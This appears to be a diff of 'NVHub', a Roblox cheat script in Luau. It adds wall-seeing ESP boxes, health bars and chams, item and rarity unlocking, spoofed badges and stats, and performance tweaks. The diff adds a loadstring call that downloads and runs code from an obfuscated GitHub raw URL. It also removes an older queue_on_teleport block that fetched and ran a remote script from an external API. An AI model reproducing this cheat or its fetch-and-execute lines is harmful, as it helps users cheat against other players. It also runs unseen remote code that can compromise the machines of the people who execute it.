+-- [[ FIXED: ADD NEW PLAYERS ]]
+Players.PlayerAdded:Connect(function(p) 
+    if p ~= LocalPlayer then 
+        espTable[p] = {player = p} 
+    end 
 end)
 
--- Startup
-for _, p in pairs(Players:GetPlayers()) do task.spawn(function() if p ~= LocalPlayer then espTable[p] = {player = p} end end) end
-Players.PlayerAdded:Connect(function(p) espTable[p] = {player = p} end)
+-- [[ FIXED: REMOVE PLAYERS AND CLEANUP ]]
+Players.PlayerRemoving:Connect(function(p)
+    if espTable[p] then
+        -- Clean up drawings
+        if espTable[p].drawings then
+            for _, v in pairs(espTable[p].drawings) do
+                pcall(function() v:Remove() end)
+            end
+        end
+        -- Clean up highlight
+        if espTable[p].highlight then
+            pcall(function() espTable[p].highlight:Destroy() end)
+        end
+        espTable[p] = nil
+    end
+end)
 
+-- [[ OPTIMIZED RENDER LOOP ]]
+RunService.Heartbeat:Connect(function()
+    -- Skip frames for performance (adjust skipFrames as needed)
+    frameCount = frameCount + 1
+    if frameCount % (skipFrames + 1) ~= 0 then return end
+    
+    -- Cache flags for performance (read once per frame)
+    local espEnabled = Flags and Flags["Box Esp"] == true
+    local boxMode = Flags and Flags["BoxType"] or "Box"
+    local mainCol = Flags and Flags["Box Color"] or Color3.new(1, 1, 1)
+    local fillEnabled = Flags and Flags["Box Fill"] == true
+    local fillCol = Flags["Box Fill Color"] or mainCol
+    local fillTrans = Flags["Box Fill Transparency"] or 0.3
+    local hEnabled = Flags and Flags["Healthbar"] == true
+    local barCol = Flags["Bar Color"] or Color3.fromRGB(0, 255, 0)
+    local chamsOutline = Flags and Flags["Chams Outline"] == true
+    local chamsFill = Flags and Flags["Chams Fill"] == true
+    local outlineCol = Flags["Outline Color"] or Color3.new(1, 1, 1)
+    local fillColChams = Flags["Fill Color"] or Color3.new(1, 0, 0)
+
+    for p, data in pairs(espTable) do
+        -- Skip if player invalid
+        if not p or not p.Parent then 
+            espTable[p] = nil
+            continue 
+        end
+        
+        local char = p.Character
+        if not char then 
+            if data.drawings then
+                for _, v in pairs(data.drawings) do v.Visible = false end
+            end
+            if data.highlight then data.highlight.Enabled = false end
+            continue 
+        end
+        
+        local root = char:FindFirstChild("HumanoidRootPart")
+        local hum = char:FindFirstChildOfClass("Humanoid")
+
+        if not root or not hum or hum.Health <= 0 then
+            if data.drawings then
+                for _, v in pairs(data.drawings) do v.Visible = false end
+            end
+            if data.highlight then data.highlight.Enabled = false end
+            continue
+        end
+        
+        local screenPos, onScreen = Camera:WorldToViewportPoint(root.Position)
+
+        if onScreen then
+            -- Create drawings if needed (lazy initialization)
+            if not data.drawings then 
+                setupDrawings(data) 
+            end
+            local drawings = data.drawings
+
+            -- Calculate box size
+            local factor = 1 / (screenPos.Z * math.tan(math.rad(Camera.FieldOfView * 0.5)) * 2) * 1000
+            local width = math.clamp(4 * factor, 10, 500)
+            local height = math.clamp(5.5 * factor, 10, 500)
+            local x, y = screenPos.X - width/2, screenPos.Y - height/2
+
+            -- BOX ESP
+            drawings.Box.Visible = (espEnabled and boxMode == "Box")
+            if drawings.Box.Visible then
+                drawings.Box.Position = Vector2.new(x, y)
+                drawings.Box.Size = Vector2.new(width, height)
+                drawings.Box.Color = mainCol
+            end
+
+            -- BOX FILL
+            drawings.BoxFill.Visible = (espEnabled and boxMode == "Box" and fillEnabled)
+            if drawings.BoxFill.Visible then
+                drawings.BoxFill.Position = Vector2.new(x, y)
+                drawings.BoxFill.Size = Vector2.new(width, height)
+                drawings.BoxFill.Color = fillCol
+                drawings.BoxFill.Transparency = fillTrans
+            end
+
+            -- CORNERS
+            if espEnabled and boxMode == "Corners" then
+                local len = width / 4
+                -- Update all corners at once if visible
+                for i = 1, 8 do
+                    drawings["C"..i].Visible = true
+                    drawings["C"..i].Color = mainCol
+                end
+                -- Top left
+                drawings.C1.From, drawings.C1.To = Vector2.new(x, y), Vector2.new(x + len, y)
+                drawings.C2.From, drawings.C2.To = Vector2.new(x, y), Vector2.new(x, y + len)
+                -- Top right
+                drawings.C3.From, drawings.C3.To = Vector2.new(x + width, y), Vector2.new(x + width - len, y)
+                drawings.C4.From, drawings.C4.To = Vector2.new(x + width, y), Vector2.new(x + width, y + len)
+  
+                drawings.C5.From, drawings.C5.To = Vector2.new(x, y + height), Vector2.new(x + len, y + height)
+                drawings.C6.From, drawings.C6.To = Vector2.new(x, y + height), Vector2.new(x, y + height - len)
+   
+                drawings.C7.From, drawings.C7.To = Vector2.new(x + width, y + height), Vector2.new(x + width - len, y + height)
+                drawings.C8.From, drawings.C8.To = Vector2.new(x + width, y + height), Vector2.new(x + width, y + height - len)
+            else
+ 
+                for i = 1, 8 do
+                    drawings["C"..i].Visible = false
+                end
+            end
+
+            drawings.HealthBar.Visible = hEnabled
+            drawings.HealthBarBG.Visible = hEnabled
+            if hEnabled then
+                local pct = hum.Health / hum.MaxHealth
+                if pct < 0 then pct = 0 elseif pct > 1 then pct = 1 end
+                
+
+                drawings.HealthBarBG.Position = Vector2.new(x - 6, y - 1)
+                drawings.HealthBarBG.Size = Vector2.new(4, height + 2)
+ 
+                local barHeight = height * pct
+                drawings.HealthBar.Size = Vector2.new(2, barHeight)
+                drawings.HealthBar.Position = Vector2.new(x - 5, y + (height - barHeight))
+                drawings.HealthBar.Color = barCol
+            end
+        else
+
+            if data.drawings then
+                for _, v in pairs(data.drawings) do v.Visible = false end
+            end
+        end
+
+
+        if chamsOutline or chamsFill then
+            if not data.highlight or data.highlight.Parent ~= CoreGui then
+                if data.highlight then pcall(function() data.highlight:Destroy() end) end
+                local h = Instance.new("Highlight")
+                h.Adornee = char
+                h.Parent = CoreGui
+                data.highlight = h
+            end
+
+            local highlight = data.highlight
+            highlight.Enabled = true
+            highlight.Adornee = char
+            highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+
+            if chamsFill then
+                highlight.FillColor = fillColChams
+                highlight.FillTransparency = 0.3
+            else
+                highlight.FillTransparency = 1
+            end
+
+            if chamsOutline then
+                highlight.OutlineColor = outlineCol
+                highlight.OutlineTransparency = 0
+            else
+                highlight.OutlineTransparency = 1
+            end
+        elseif data.highlight then
+            data.highlight.Enabled = false
+        end
+    end
+end)
 
 game:GetService("RunService").RenderStepped:Connect(function()
 -- Frame skipping to prevent freeze
@@ -999,7 +1202,7 @@ if opacity ~= config.Transparency then
 	setTransparency(opacity)
 end
 end)
--- Spinbot & Jitter Function - Add at bottom of script
+
 task.spawn(function()
     task.wait(3)
     
@@ -1032,6 +1235,115 @@ task.spawn(function()
         end
     end)
 end)
+
+-- [[ NVHub | Extreme Performance Optimizer FIXED ]]
+
+getgenv()._originalSettings = getgenv()._originalSettings or {}
+
+local function applyPerformanceBoost(enable)
+    local Workspace = game:GetService("Workspace")
+    local Terrain = Workspace:FindFirstChildOfClass("Terrain")
+    local Lighting = game:GetService("Lighting")
+    local NetworkClient = game:GetService("NetworkClient")
+    local Players = game:GetService("Players")
+    local localPlayer = Players.LocalPlayer
+    local Camera = Workspace.CurrentCamera or Workspace:FindFirstChildOfClass("Camera")
+
+    -- 1. STORE SETTINGS
+    if enable and not getgenv()._originalSettings.saved then
+        getgenv()._originalSettings = {
+            saved = true,
+            GlobalShadows = Lighting.GlobalShadows,
+            FogEnd = Lighting.FogEnd,
+            FogStart = Lighting.FogStart,
+            Brightness = Lighting.Brightness,
+            Ambient = Lighting.Ambient,
+            OutdoorAmbient = Lighting.OutdoorAmbient,
+            Technology = Lighting.Technology,
+            QualityLevel = settings().Rendering.QualityLevel,
+            FieldOfView = Camera.FieldOfView,
+        }
+    end
+
+    if enable then
+        -- 2. RENDER DISTANCE & FOV
+        if Camera then
+            Camera.FieldOfView = 60
+        end
+        
+     local function strip(v)
+    if v:IsA("BasePart") or v:IsA("MeshPart") then
+        -- Handle Material-based Reflections
+        if v.Material == Enum.Material.Glass or v.Material == Enum.Material.Plastic then
+            -- Keep reflections for these specific materials
+            v.Reflectance = 0.5 -- Adjust this number (0 to 1) for how shiny you want it
+        else
+            -- Strip everything else to SmoothPlastic for FPS
+            v.Material = Enum.Material.SmoothPlastic
+            v.Reflectance = 0
+        end
+
+        v.CastShadow = false
+        
+        -- Clear heavy textures but keep the part color/shine
+        if v:IsA("MeshPart") then 
+            v.TextureID = "" 
+        end
+    elseif v:IsA("Decal") or v:IsA("Texture") then
+        v.Transparency = 1
+    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+        v.Enabled = false
+    end
+end
+
+        -- 4. LIGHTING & TERRAIN
+        Lighting.GlobalShadows = false
+        Lighting.Technology = Enum.Technology.Compatibility
+        settings().Rendering.QualityLevel = 1
+        
+        if Terrain then
+            Terrain.WaterWaveSize = 0
+            Terrain.WaterWaveSpeed = 0
+            Terrain.WaterReflectance = 0
+            Terrain.WaterTransparency = 1
+        end
+
+        -- 5. NETWORK & CPU
+        setfpscap(999)
+        NetworkClient:SetOutgoingKBPSLimit(900)
+        settings().Network.IncomingReplicationLag = 0
+        
+    else
+        -- 6. RESTORE SETTINGS
+        local s = getgenv()._originalSettings
+        if s.saved then
+            Lighting.GlobalShadows = s.GlobalShadows
+            Lighting.Brightness = s.Brightness
+            Lighting.Technology = s.Technology
+            settings().Rendering.QualityLevel = s.QualityLevel
+            if Camera then Camera.FieldOfView = s.FieldOfView end
+        end
+    end
+end
+
+-- 7. MONITORING LOOP (Fixed Flag Reference)
+task.spawn(function()
+    task.wait(2)
+    local lastState = false
+    
+    while task.wait(0.5) do
+        -- Check if Flags table exists yet
+        if _G.Flags or Flags then
+            local currentFlags = _G.Flags or Flags
+            local boostActive = currentFlags["Ping/Fps BOOST"]
+            
+            if boostActive ~= lastState then
+                lastState = boostActive
+                applyPerformanceBoost(lastState)
+            end
+        end
+    end
+end)
 -- We reset this to nil to ensure the loop actually starts when you execute
 getgenv().gg_scripters = nil
 
@@ -1062,29 +1374,49 @@ end
 
 getgenv().gg_scripters = "ItsNVfr"
 
-
-
 local Camera = workspace.CurrentCamera
 
--- We use a different variable to prevent conflicts with the stretch script
+
 if getgenv().zoom_scripters == nil then
 	game:GetService("RunService").Heartbeat:Connect(function()
-	-- Frame skipping to prevent freeze
 
-	-- 1. THE TOGGLE CHECK
 	if Flags["Enable Custom Fov"] then
 
-		-- 2. THE SLIDER CHECK
 		local zoomDistance = Flags["Zoom Out"] or 0
 
-		-- 3. THE UPDATED FUNCTION
 		Camera.CFrame = Camera.CFrame * CFrame.new(0, 0, zoomDistance)
 	end
 end)
 end
 
 getgenv().zoom_scripters = "ItsNVfr"
+-- [[ NVHub Lighting Engine | Ambient & World ]]
+local Lighting = game:GetService("Lighting")
 
+-- Store original settings so we can reset when disabled
+local originalOutdoor = Lighting.OutdoorAmbient
+local originalAmbient = Lighting.Ambient
+
+RunService.RenderStepped:Connect(function()
+frameCount = frameCount + 1
+if frameCount % (skipFrames + 1) ~= 0 then return end
+    if Flags["Enable ambient"] then
+        local targetColor = Flags["Ambient Color"] or Color3.fromRGB(255, 255, 255)
+        
+        -- Force the world colors to your picker's color
+        Lighting.OutdoorAmbient = targetColor
+        Lighting.Ambient = targetColor
+        
+        -- Optional: Makes the colors "pop" more by fixing brightness
+        Lighting.Brightness = 2 
+        Lighting.GlobalShadows = false -- Set to false for a "Fullbright" effect with your color
+    else
+        -- Reset to default if the toggle is off
+        Lighting.OutdoorAmbient = originalOutdoor
+        Lighting.Ambient = originalAmbient
+        Lighting.GlobalShadows = true
+    end
+end)
 -- Fog Logic (Bottom of Script)
 task.spawn(function()
 local Lighting = game:GetService("Lighting")
@@ -1244,8 +1576,9 @@ local function loadSettings()
 		end
 	end
 end
-
+task.wait(2)
 loadSettings()
+task.wait(1)
 task.spawn(function()
 while true do
 	config.unlockAll = Flags["UnlockAll"]
@@ -1429,6 +1762,7 @@ end
 for _, v in ipairs({
     "Unobtainable"," Mythical", "Legendary", "Epic", "Common", "Rare", "Unique"
 }) do
+task.wait(0.9)
     unlockrarity(v)
 end
 
@@ -2137,6 +2471,34 @@ end
 task.wait(0.5)
 CreateMobileButton()
 
+-- Simple Flag to getgenv mapper
+task.spawn(function()
+    while true do
+        task.wait(0.1)
+        
+        -- Status
+        if Flags["Status"] then
+            getgenv().status = Flags["Status"]
+        end
+        
+        -- Badges
+        getgenv().premium = Flags["premium badge"] or nil
+        getgenv().verify = Flags["Verified badge"] or nil
+        
+        -- Headless
+        getgenv().headless = Flags["Headless"] or nil
+        
+        -- Stats
+        getgenv().keys = Flags["Keys"] or nil
+        getgenv().level = Flags["Level"] or nil
+        getgenv().streak = Flags["Streak"] or nil
+        getgenv().casualwinrate = Flags["regular wr"] or nil
+        getgenv().rankedwinrate = Flags["ranked wr"] or nil
+        getgenv().casualwins = Flags["regular wins"] or nil
+        getgenv().rankedwins = Flags["ranked wins"] or nil
+    end
+end)
+
 task.wait(6)
 -- Default values if getgenv variables aren't set
 local CONFIG = {
@@ -2601,9 +2963,7 @@ task.spawn(function()
     end))
 end)
 
--- ════════════════════════════════════════════════════════
--- INITIALIZATION (NO REFRESH LOOP - NO LAG)
--- ════════════════════════════════════════════════════════
+
 
 task.spawn(function()
     if not game:IsLoaded() then
@@ -2622,10 +2982,14 @@ task.wait(2)
         updateNametag()
     end
 end)
+    task.wait(2)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/idontthinkicngetiudwatidiujsuighapuo/blackbootydghjdghj234/refs/heads/main/babhfsiudhoiughuifguhudhgudufg"))()
+task.wait(1)
 
 -- NVs Rage Config - FIXED VERSION
 task.spawn(function()
-    task.wait(5)
+    task.wait(1)
     
     local savedSettings = {}
     local isRageActive = false
@@ -2712,11 +3076,11 @@ task.spawn(function()
                 
                 -- Override click
                 btn.MouseButton1Click:Connect(function()
-                    task.wait(0.1)
+                    task.wait(1)
                     if not isRageActive then
                         -- Turning ON
                         saveCurrent()
-                        task.wait(0.1)
+                        task.wait(2)
                         applyConfig()
                         isRageActive = true
                         Flags["NVs rage config"] = true
@@ -2733,28 +3097,7 @@ task.spawn(function()
                 break
             end
         end
-        if not found then task.wait(1) end
+        if not found then task.wait(2) end
     end
 end)
 
-local queue_on_teleport = queue_on_teleport or function() end
-queue_on_teleport([[
-if not game:IsLoaded() then game.Loaded:Wait() end
-task.wait(11)
-
--- Restore getgenv settings
-]] .. (function()
-    local env = ""
-    for k, v in pairs(getgenv()) do
-        if type(v) ~= "function" and type(v) ~= "userdata" and type(v) ~= "table" then
-            if type(v) == "string" then
-                env = env .. "getgenv()." .. tostring(k) .. " = " .. string.format("%q", v) .. "\n"
-            else
-                env = env .. "getgenv()." .. tostring(k) .. " = " .. tostring(v) .. "\n"
-            end
-        end
-    end
-    return env
-end)() .. [[
-task.wait(2)
-loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/03206217bb789639e8611c7bf4b9e5a62f786db01ffa1fd98e78ec2be8ba1740/download"))()]])
